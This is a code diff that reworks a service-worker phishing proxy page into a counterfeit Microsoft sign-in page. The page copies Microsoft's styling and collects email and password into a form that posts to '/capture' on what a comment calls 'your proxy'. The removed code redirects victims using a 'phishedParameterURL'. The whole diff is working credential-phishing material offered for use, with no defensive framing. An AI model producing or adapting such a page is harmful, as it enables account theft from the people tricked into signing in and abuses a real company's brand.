@@ -1,30 +1,119 @@
 <!DOCTYPE html>
-<html lang="fr">
-
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        /* Microsoft‑style minimal CSS – you can expand this */
+        body {
+            background: #f0f2f5;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: #fff;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            width: 360px;
+            max-width: 90%;
+        }
+        .login-box h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-top: 0;
+            margin-bottom: 20px;
+            color: #1a1a1a;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d3d3d3;
+            border-radius: 4px;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: border-color 0.15s;
+        }
+        .input-group input:focus {
+            border-color: #0078D4;
+            outline: none;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: #0078D4;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .btn-primary:hover {
+            background: #0067b8;
+        }
+        .error-msg {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+        }
+        .footer-links {
+            margin-top: 20px;
+            font-size: 13px;
+            text-align: center;
+        }
+        .footer-links a {
+            color: #0078D4;
+            text-decoration: none;
+        }
+    </style>
 </head>
-
 <body>
+    <div class="login-box">
+        <h1>Sign in</h1>
+        <!-- The form posts to /capture on your proxy -->
+        <form id="loginForm" action="/capture" method="POST">
+            <div class="input-group">
+                <label for="email">Email or phone</label>
+                <input type="email" id="email" name="email" required placeholder="example@outlook.com" autocomplete="email">
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="btn-primary">Sign in</button>
+        </form>
+        <div id="errorContainer" class="error-msg" style="display:none;"></div>
+        <div class="footer-links">
+            <a href="#">Forgot password?</a> &middot; <a href="#">Create one</a>
+        </div>
+    </div>
+
+    <!-- Service Worker registration (optional but keep if you want) -->
     <script>
         if ("serviceWorker" in navigator) {
-            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
-                scope: "/",
-            })
-                .then((registration) => {
-                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
-                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
-
-                    self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
-                })
-                .catch((error) => {
-                    console.error(`Service worker registration failed: ${error}`);
-                });
-        }
-        else {
-            console.error("Service workers are not supported by this browser");
+            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", { scope: "/" })
+                .then(() => console.log("✅ SW registered"))
+                .catch(err => console.error("❌ SW registration failed:", err));
         }
     </script>
-</body>
 
+    <!-- Remove the auto‑redirect logic completely – we do NOT want to redirect -->
+</body>
 </html>
